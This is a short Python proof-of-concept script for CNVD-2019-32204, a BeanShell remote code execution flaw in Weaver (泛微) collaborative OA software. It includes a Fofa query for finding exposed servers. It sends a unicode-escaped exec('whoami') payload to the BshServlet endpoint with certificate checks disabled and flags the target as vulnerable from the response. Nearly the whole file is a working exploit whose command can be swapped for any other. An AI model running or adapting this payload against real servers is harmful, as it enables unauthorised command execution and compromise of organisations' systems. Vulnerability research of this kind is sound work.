# -*- coding: utf-8 -*-
# 泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204
# Fofa:  app="泛微-协同办公OA"
import requests
import sys,re
import urllib


def CNVD_2019_32204(target):
    relsult = {
        'name': '泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204',
        'vulnerable': False
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    target = urllib.parse.urljoin(target, "weaver/bsh.servlet.BshServlet")
    payload = """bsh.script=\\u0065\\u0078\\u0065\\u0063("whoami");&bsh.servlet.output=raw"""
    try:
        requests.packages.urllib3.disable_warnings()
        request = requests.post(headers=headers, url=target, data=payload, timeout=5, verify=False)
        if ";</script>" not in request.text and re.search('BeanShell', request.text):
            if "Login.jsp" not in request.text:
                if "Error" not in request.text:
                    if "<head>" not in request.text:
                        relsult['vulnerable'] = True
                        relsult['url'] = target
                        relsult['method'] = 'POST'
                        relsult['payload'] = payload
                        relsult['about'] = 'https://www.cnblogs.com/yyhuni/p/14544814.html, https://blog.csdn.net/dust_hk/article/details/101621462'
                        return relsult
        return relsult
    except:
        return relsult


if __name__ == '__main__':
    url = input('url:')
    print(CNVD_2019_32204(url))